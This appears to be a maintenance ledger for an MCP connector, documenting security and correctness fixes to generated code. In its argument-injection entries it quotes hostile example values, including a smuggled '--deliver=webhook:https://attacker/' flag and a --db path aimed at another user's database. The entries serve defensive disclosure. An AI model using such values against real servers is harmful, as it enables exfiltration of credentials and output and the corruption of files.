_comment: Connector-specific edits to GENERATED files that a cli-printing-press reprint must NOT clobber. check_handfixes.py asserts every marker below is still present (and banned anti-patterns absent) and fails CI if a reprint dropped one. Provenance: project_mcp_sync_envvar_and_promote_toolsmanifest.md (reprint 2026-06-06, press 4.22.0, Level RMM).

handfixes.summary: Auth env var stays the spec canonical LEVEL_API_TOKEN everywhere; mcp-sync/promote rewrite it to the slug-derived LEVELIO_API_TOKEN, breaking MCP auth
handfixes.why: Level's spec x-auth-env-vars is LEVEL_API_TOKEN (not LEVELIO_*). config.go reads LEVEL_API_TOKEN, but press 4.22.0 `mcp-sync` derives the var from the api_name slug and rewrites manifest.json (user_config + mcp_config.env), .printing-press.json, tools.go agent hints, and tools-manifest.json to LEVELIO_API_TOKEN while config.go keeps the canonical - a silent 401 for every .mcpb/MCP user. `lock promote` re-triggers it. A reprint/polish/promote plants the bug again. The fix keeps LEVEL_API_TOKEN aligned across config.go + manifest + server + tools.go.
handfixes.spec_encode_followup: Fix belongs in the press: mcp-sync must honor x-auth-env-vars and never derive the auth var from the api_name slug. Filed as a retro (manuscripts/levelio/20260606-173908 findings).

handfixes.summary: doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential
handfixes.why: `doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` "reachable" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed "present, not verified" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as "FAIL API: unreachable" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282.

handfixes.summary: every operator credential this connector reads is declared on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md (manual install)
handfixes.why: Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For levelio the manifest gained: LEVELIO_BASE_URL. server.json gained: LEVELIO_BASE_URL. mcp-install.md's env blocks gained: LEVELIO_BASE_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out.
handfixes.spec_encode_followup: cli-printing-press should emit server.mcp_config.env, the matching user_config prompts, server.json environmentVariables and mcp-install.md's env blocks from ONE declaration of the connector's operator-facing environment, so the three channels cannot be generated out of step. Until then check_env_schema.py compares all three and this ledger pins them.

handfixes.summary: The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing
handfixes.why: The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {"db": "/path/to/someone-elses.sqlite"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because "db=/tmp/evil" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.
handfixes.spec_encode_followup: Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.

handfixes.summary: cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.
handfixes.why: blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {"json": "--deliver=webhook:https://attacker/"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.

handfixes.summary: Recipe intent handlers (internal/mcp/intents.go) build argv for the companion CLI outside cliArgsFromMCP. appendRecipeStringFlag now always emits one --name=value element (the useEquals=false split branch is gone), and every appendRecipePositional call site first runs rejectFlagLikeRecipeValue, which refuses a positional value beginning with '-' (except the bare '-') before the CLI runs.
handfixes.why: Found by Codex adversarial review of the fleet mcp-argv-value-joined backport (2026-09-09): the recipe path had the same key-only gap. A recipe positional is appended to argv AHEAD of the recipe's own flags, so {"domain": "--deliver=webhook:https://attacker/"} became `exceptions find --deliver=webhook:... --agent` and pflag parsed the value as the denylisted root flag (and {"domain": "--dry-run"} demonstrably changed execution). The split appendRecipeStringFlag branch was safe only because its one caller's flag is a string flag that consumes the next token; a future NoOptDefVal flag would reopen it. Upstream cli-printing-press be378adf (#4647) fixed cliArgsFromMCP but NOT this recipe path, so a reprint REINTRODUCES it while go build and go test stay green; this entry is what notices. Mirrors cobratree.validatePositionalArgsForMCP, which already applies this rule to the raw args field. Retire only when the press generator refuses flag-like recipe positionals itself.

handfixes.summary: mcp-install.md, README.md and page.json carry the interim security note and pause the remote-agent recipe (stdio-to-HTTP bridge launch line commented out, no tunnel step) until this connector is reprinted.
handfixes.why: Docs-only interim fix ratified 2026-10-22 (follow-up to #428). This connector is stdio-only, so the remote-agent recipe put it behind a supergateway bridge that adds no password: anyone who can reach the bridge's port can use the MCP tools with the stored credentials. The docs must not tell anyone to run the bridge or tunnel it. mcp-install.md and README.md are regenerated by msp-skills-publish onboard.py (gen_mcp_install, render_readme); this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix.

asserts.contains: # Remote agents (paused until this connector is reprinted)
the bridge it would need is paused until it is reprinted
the bridge it would need is paused until it is reprinted

handfixes.summary: An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)
handfixes.why: The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.
handfixes.spec_encode_followup: Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.

handfixes.summary: One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.
handfixes.why: class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \v, \0 and the identity escape, a bounded \u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.
handfixes.spec_encode_followup: Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.

handfixes.summary: README.md, mcp-install.md and page.json say the ChatGPT desktop app runs this connector locally (STDIO) and that ChatGPT on the web, Microsoft 365 Copilot / Copilot Studio and the Gemini app are not supported by msp-skills yet, with a link to the hosted-gateway comparison; no paid-plan list, no Developer Mode recipe, no 'ChatGPT connects only to remote servers'.
handfixes.why: Docs fix approved 2026-11-03, following PR #502. OpenAI's MCP docs (https://learn.chatgpt.com/docs/extend/mcp) say the ChatGPT desktop app, Codex CLI and the IDE extension support MCP servers, add them as STDIO, and share MCP configuration; ChatGPT on the web uses remote MCP through plugins and does not read local Codex config. The old text listed ChatGPT plans, said ChatGPT connects only to remote servers, and on the reprinted connectors told users to host the connector over HTTPS for a Developer Mode connector and Copilot Studio; SECURITY.md pauses HTTP mode until each connector is reprinted. README.md, mcp-install.md and page.json are regenerated by msp-skills-publish onboard.py, whose template still writes the old ChatGPT text, so without this entry a re-onboard or reprint silently restores it.
handfixes.spec_encode_followup: Change the ChatGPT, Microsoft 365 Copilot and Gemini app text in onboard.py (cc-skills msp-skills-publish) so a regeneration writes this wording itself, then this entry can be retired.

handfixes.summary: sync wraps the event writer its parallel workers share in syncSerialWriter (internal/cli/sync_event_writer.go), so two workers never call Write on it at once.
handfixes.why: The generated sync hands cmd.OutOrStdout() (or ErrOrStderr() in machine output) to every --concurrency worker, and each writes sync_start, progress and error events. os.Stdout tolerates that; the writers --deliver (a mirror into a bytes.Buffer) and --receipt-file / --audit-dir (a running SHA-256) install do not, nor does an in-process caller's buffer: Windows CI on PR #655 panicked in bytes.Buffer.grow from syncResource, and go test -race found 28 races on veeam. TestSyncWorkerPoolSerializesEventWrites pins it. A reprint regenerates sync.go and drops the wrap; tools/maintainer/replay_handfixes.py re-applies it (fleet_handfixes.json sync-event-writer-serialized).
handfixes.spec_encode_followup: Press-side (mvanhorn/cli-printing-press#5369): the sync template should serialize the event writer its top-level worker pool shares, as its dependent path already does with lockedWriter.

handfixes.summary: sync_progress reports measured rows per second (rows_per_sec, and rate_rps as the same value); the limiter's ceiling is limiter_ceiling_rps.
handfixes.why: The generated sync printed the adaptive limiter's ceiling as rate_rps and as req/s on the human line, so 4.9 was reported while the sync stored 33 rows a second (#694). A reprint regenerates sync.go and brings it back; tools/maintainer/replay_handfixes.py re-applies it (fleet_handfixes.json sync-progress-measured-rate).
handfixes.spec_encode_followup: Press-side: the sync template should report a measured rate and name the limiter's ceiling separately (not filed yet).

handfixes.summary: sync writes at most one sync_progress line per resource every 5 seconds (the first page always reports; sync_complete carries the final count), instead of one per page.
handfixes.why: Every write to stdout or stderr costs a full credential check whatever its size, and sync wrote one progress line per page: 74% of hubspot sync's CPU at a real server's pace (#696). A reprint regenerates sync.go with one line per page; tools/maintainer/replay_handfixes.py re-applies the guard (fleet_handfixes.json sync-progress-throttled).
handfixes.spec_encode_followup: Press-side: the sync template's per-page progress line should be throttled, as its dependent walk already is (not filed yet).

handfixes.summary: Search indexes 3-letter ALL-CAPS values (WEB, SQL, DNS): the key-blind drop in shouldIndexSearchString is deleted, as press v4.25.1 did
handfixes.why: Issue #464. shouldIndexSearchString (cli/internal/store/store.go) dropped every exactly-3-letter all-caps string whatever the key (meant for currency and country codes), so a record named WEB, SQL or DNS never reached resources_fts and CLI search and the MCP search tool returned 0 rows for it. cli-printing-press removed the branch in v4.25.1 (e2a9b501, #3185); this connector was printed on 4.24.0, so the deletion is back-ported by hand in the press 4.35.5 shape (the `upper :=` line goes too). A press >= 4.25.1 reprint regenerates this shape; a reprint from an older press brings the branch back, which the not_contains assert catches. fts_three_letter_caps_test.go fails with the branch present.

handfixes.summary: StoreSchemaVersion 4->5 and resourcesFTSContentSchemaVersion -> 5 (kept <= StoreSchemaVersion) so a store synced by the old binary rebuilds resources_fts once and WEB/SQL/DNS become searchable
handfixes.why: Issue #464. Deleting the 3-letter ALL-CAPS drop only changes rows written from now on; resources_fts rows already on disk still lack those values. A read-write open of a store stamped below resourcesFTSContentSchemaVersion rebuilds resources_fts through the fixed filter, so the content version must sit above the old binary's stamp (4) and must not exceed StoreSchemaVersion (else the rebuild repeats on every open). The MCP server opens the store read-only, so users run `sync` once after upgrading (CHANGELOG). A reprint does NOT produce these numbers: press 4.35.5 emits StoreSchemaVersion 8 and resourcesFTSContentSchemaVersion 4, plus a v6 trigram rebuild that re-indexes stores stamped below 6. Reconcile this entry on any reprint: keep the reprint's numbers only if a store stamped 5 by this build still gets the fixed content (the trigram rebuild covers that for a stamp below 6), and never let the store version go below 5. TestOpen_RebuildsFTSForThreeLetterAllCapsOnOldStore fails if either constant is wrong.

handfixes.summary: <PREFIX>_MCP_READ_ONLY=1 lists only tools annotated readOnlyHint=true, and the code-orchestration execute tool refuses every non-GET call; the press 4.34.0 code, back-ported to a print that predates it.
handfixes.why: The connector was printed before press 4.33.4 added the switch, so it never read it: an operator who set <PREFIX>_MCP_READ_ONLY=1 still got every write tool, and <api>_execute still sent POST, PUT, PATCH and DELETE (#687 to #690). TestMCPReadOnlySwitchListsOnlyReadOnlyTools and, with code_orch.go, TestCodeOrchExecuteRefusesNonGETUnderMCPReadOnly pin it. A reprint on press 4.34.0 or later generates it and retires this entry; below that, tools/maintainer/replay_handfixes.py re-applies it (fleet_handfixes.json mcp-read-only-switch).
handfixes.spec_encode_followup: None: press 4.34.0 generates it (cli-printing-press #4986, #5097, #5191); a reprint retires this entry.
